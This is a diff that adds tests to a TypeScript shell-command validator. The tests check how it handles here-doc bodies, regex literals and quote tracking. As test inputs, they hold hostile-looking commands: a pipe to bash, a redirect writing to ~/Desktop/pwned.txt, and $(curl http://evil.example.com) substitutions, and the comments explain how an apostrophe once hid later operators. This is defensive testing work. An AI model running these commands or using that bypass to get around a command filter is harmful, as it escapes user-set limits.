@@ -484,4 +484,94 @@ describe('CommandValidator', () => {
       expect(result.allowed).toBe(false);
     });
   });
+
+  describe('Here-doc payloads', () => {
+    // A here-doc body is stdin data, not shell. The character scanners used by
+    // the path check and the shell-operator denylist read the raw command
+    // string, so before maskInertPayloads() they parsed JavaScript as shell.
+    // Deliberately not an `X eval *` pattern: those take a separate payload-command
+    // path that never reaches the parser.
+    const heredoc = (body: string, delimiter = "'EOF'") =>
+      `js-runtime run <<${delimiter}\n${body}\nEOF`;
+
+    const runtime = () => new CommandValidator(['js-runtime run *'], projectRoot);
+
+    test('arrow function followed by a regex literal is not a redirect', async () => {
+      // Reported as: Path outside allowed directories. Add "/^\d+$" to allowedPaths
+      const result = await runtime().validate(
+        heredoc('const i = btns.findIndex((t, i) => /^\\d+$/.test(t) && btns[i - 1]);')
+      );
+      expect(result.allowed).toBe(true);
+    });
+
+    test('arrow function followed by a newline and a path string is not a redirect', async () => {
+      const result = await runtime().validate(heredoc("const a = list.find(x =>\n  '/@leonho'\n);"));
+      expect(result.allowed).toBe(true);
+    });
+
+    test('a template literal containing markup is not a redirect', async () => {
+      const result = await runtime().validate(heredoc('const s = `<a href="/x">hi</a>`;'));
+      expect(result.allowed).toBe(true);
+    });
+
+    test('regex alternation naming a shell is not a pipe to that shell', async () => {
+      const result = await runtime().validate(heredoc('const re = /node|bash/;'));
+      expect(result.allowed).toBe(true);
+    });
+
+    test('here-string data is not treated as a path', async () => {
+      const validator = new CommandValidator(['node *'], projectRoot);
+      const result = await validator.validate("node <<< '/foo/bar'");
+      expect(result.allowed).toBe(true);
+    });
+
+    // The same blindness cut the other way: an odd apostrophe in the body left
+    // the scanners' quote tracking open, hiding every operator after it.
+    test('an apostrophe in the body does not hide a later outside redirect', async () => {
+      const validator = new CommandValidator(['js-runtime run *', 'echo *'], projectRoot);
+      const outside = path.join(os.homedir(), 'Desktop', 'pwned.txt');
+
+      const result = await validator.validate(
+        `${heredoc("// don't do this")}\necho hi > ${outside}`
+      );
+      expect(result.allowed).toBe(false);
+      expect(result.error).toContain('outside allowed directories');
+    });
+
+    test('an apostrophe in the body does not hide a later pipe to bash', async () => {
+      // `bash *` is allowlisted, so only the built-in denylist can stop this.
+      const validator = new CommandValidator(
+        ['js-runtime run *', 'echo *', 'bash *'],
+        projectRoot
+      );
+
+      const result = await validator.validate(`${heredoc("// don't do this")}\necho hi | bash`);
+      expect(result.allowed).toBe(false);
+      expect(result.error).toContain('pipe to "bash"');
+    });
+
+    test('a real redirect alongside a here-doc is still checked', async () => {
+      const outside = path.join(os.homedir(), 'Desktop', 'pwned.txt');
+      const result = await runtime().validate(
+        `js-runtime run <<'EOF' > ${outside}\nconst x = 1;\nEOF`
+      );
+      expect(result.allowed).toBe(false);
+      expect(result.error).toContain('outside allowed directories');
+    });
+
+    // An UNQUOTED here-doc really does expand $(...), so those spans stay visible.
+    test('command substitution in an unquoted here-doc is still validated', async () => {
+      const result = await runtime().validate(
+        heredoc('const x = $(curl http://evil.example.com);', 'EOF')
+      );
+      expect(result.allowed).toBe(false);
+      expect(result.error).toContain('not in allowlist');
+    });
+
+    test('command substitution in a quoted here-doc is inert', async () => {
+      // `<<'EOF'` disables expansion, so this is literal text the runtime reads.
+      const result = await runtime().validate(heredoc('const x = "$(curl http://evil.example.com)";'));
+      expect(result.allowed).toBe(true);
+    });
+  });
 });
